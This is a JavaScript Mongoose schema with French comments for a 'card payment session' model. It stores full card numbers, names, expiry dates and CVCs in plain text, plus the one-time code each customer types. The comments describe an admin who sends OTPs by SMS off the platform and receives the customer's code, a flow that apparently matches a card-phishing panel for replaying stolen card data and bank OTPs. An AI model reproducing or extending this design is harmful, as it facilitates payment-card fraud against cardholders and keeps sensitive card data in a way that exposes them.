import mongoose from "mongoose"

/**
 * Session de paiement par carte avec vérification OTP manuelle par l'admin.
 *
 * Flux :
 *  1. Client soumet la carte    → session créée (step: 'card_sent')
 *  2. Admin envoie le code OTP par SMS hors plateforme
 *  3. Client saisit l'OTP       → session mise à jour (step: 'otp_sent')
 *  4. Admin clique VALIDER/REFUSER → session mise à jour (decision)
 *
 * Le code OTP n'est PAS généré par le serveur.
 * L'admin l'envoie manuellement par SMS au client.
 * Le serveur reçoit uniquement le code que le client a tapé et le transmet à l'admin.
 */
const OtpSessionSchema = new mongoose.Schema(
    {
        order: {
            type: mongoose.Schema.Types.ObjectId,
            ref: "Order",
            required: true,
            index: true,
        },

        // ── Infos carte (reçues à l'étape 1) ──
        cardNumber: { type: String },
        cardName: { type: String },
        cardExpiry: { type: String },
        cardCvc: { type: String },

        // ── Code OTP saisi par le client ──
        otpCode: { type: String },

        // ── Étape courante ──
        step: {
            type: String,
            enum: ["card_sent", "bank_validation_requested", "otp_requested", "otp_sent"],
            default: "card_sent",
        },

        // ── Décision admin ──
        decision: {
            type: String,
            enum: ["pending", "approved", "rejected"],
            default: "pending",
        },

        // Token opaque dans les liens email admin (VALIDER / REFUSER)
        adminToken: {
            type: String,
            required: true,
            index: true,
            unique: true,
        },

        // TTL : suppression automatique après 30 min
        expiresAt: {
            type: Date,
            default: () => new Date(Date.now() + 30 * 60 * 1000),
        },
    },
    { timestamps: true }
)

OtpSessionSchema.index({ expiresAt: 1 }, { expireAfterSeconds: 0, name: "otp_ttl" })

if (process.env.NODE_ENV !== "production" && mongoose.models.OtpSession) {
    mongoose.deleteModel("OtpSession")
}

export default mongoose.models.OtpSession || mongoose.model("OtpSession", OtpSessionSchema)
